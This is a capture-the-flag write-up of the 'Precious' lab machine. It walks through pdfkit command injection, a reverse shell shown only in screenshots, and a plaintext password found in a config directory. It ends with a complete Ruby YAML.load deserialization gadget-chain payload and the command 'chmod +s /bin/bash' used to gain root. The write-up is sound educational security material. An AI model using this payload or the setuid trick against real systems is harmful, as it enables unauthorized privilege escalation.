---
description: PDFkit and Deserialization.
---

# Precious

## Gaining Access

**Nmap Scan:**

<figure><img src="../../../.gitbook/assets/image (2562).png" alt=""><figcaption></figcaption></figure>

Seems like a web vulnerability exploit kinda machine.

### PDFKit

<figure><img src="../../../.gitbook/assets/image (3587).png" alt=""><figcaption></figcaption></figure>

Website to PDF ind of functions run on plugins, and depending on the language used to do this conversion (JS, PHP), there are exploits for them.

For instance, we can redirect this website to our own hosted HTTP server and convert that. Alternatively, attempts can be made in order to exploit the website via LFI to read the files on the machine.

For enumeration purposes, I began by generating a PDF and downloading it to my machine from this website. We can enumerate the PDF to see if there is a particular software being used.

<figure><img src="../../../.gitbook/assets/image (2085).png" alt=""><figcaption></figcaption></figure>

This version of pdfkit is vulnerable to RCE using CVE-2022-25765. There are public exploit scripts available for this.

{% embed url="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795" %}

Following the exploit, we can test to see if we indeed have RCE:

<figure><img src="../../../.gitbook/assets/image (245).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1514).png" alt=""><figcaption></figcaption></figure>

Works! Now we just need to gain a reverse shell. I used a simple bash shell to do so.

<figure><img src="../../../.gitbook/assets/image (2818).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2551).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Getting Henry

When we gain access as the user ruby, the flag is not there. There is another user named henry in this machine.

<figure><img src="../../../.gitbook/assets/image (970).png" alt=""><figcaption></figcaption></figure>

We don't have permissions to read the flag from henry's directory. However, when poking around ruby's directory and looking into the .bundle directory, we can find henry's password.

<figure><img src="../../../.gitbook/assets/image (2478).png" alt=""><figcaption></figcaption></figure>

With this, we can SSH in as henry for a better shell. Then, we can grab the user flag.

### Ruby Deserialization

Checking sudo privileges, we find that henry is able to execute the following:

<figure><img src="../../../.gitbook/assets/image (2286).png" alt=""><figcaption></figcaption></figure>

Intriguing. The script is as shown below:

```ruby
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

From the looks of this script, YAML.load function is being used. There are certain deserialization exploits for this. The attack is known as 'YAML Deserialization'

Hacktricks has a relevant page covering it.

{% embed url="https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization" %}

When searching along the lines of Ruby deserialisation attacks through YAML.load, I found this article which included a PoC.

{% embed url="https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/" %}

How this works is thorugh implementing a gadget chain that was previously used with other Ruby YAML exploits. This basically gives us RCE over the machine as root.&#x20;

We just need to put the malicious YAML file in some writeable place and execute it. Works because the script does not check for an absolute path. Here's the PoC:

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

I changed the command to `chmod +s /bin/bash` and tried it out. Worked!

<figure><img src="../../../.gitbook/assets/image (1776).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1286).png" alt=""><figcaption></figcaption></figure>

Rooted!
